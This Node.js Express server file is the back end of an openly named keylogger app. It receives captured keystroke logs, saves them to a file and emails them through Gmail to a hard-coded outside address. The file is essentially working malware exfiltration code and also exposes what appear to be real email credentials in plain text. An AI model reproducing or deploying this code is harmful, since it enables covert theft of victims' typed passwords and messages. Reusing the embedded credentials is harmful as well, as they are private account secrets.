const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3001;

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '../keylogger-app/build')));

app.post('/send-log', (req, res) => {
    const keyLog = req.body.log;
    fs.writeFileSync('key_log.txt', keyLog);

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'hka661181@gmail.com', // replace with your email
            pass: 'idontknow178'  // replace with your email password or app password
        }
    });

    let mailOptions = {
        from: 'hka661181@gmail.com>',
        to: 'hadyka17th81998@gmail.com',
        subject: 'Key Log File',
        text: 'Here is the key log file.',
        attachments: [
            {
                filename: 'key_log.txt',
                content: fs.readFileSync('key_log.txt')
            }
        ]
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).json({ message: 'Failed to send email.' });
        }
        res.json({ message: 'Email sent successfully!' });
    });
});

app.listen(port, () => {
    console.log(`Backend server running at http://localhost:${port}`);
});
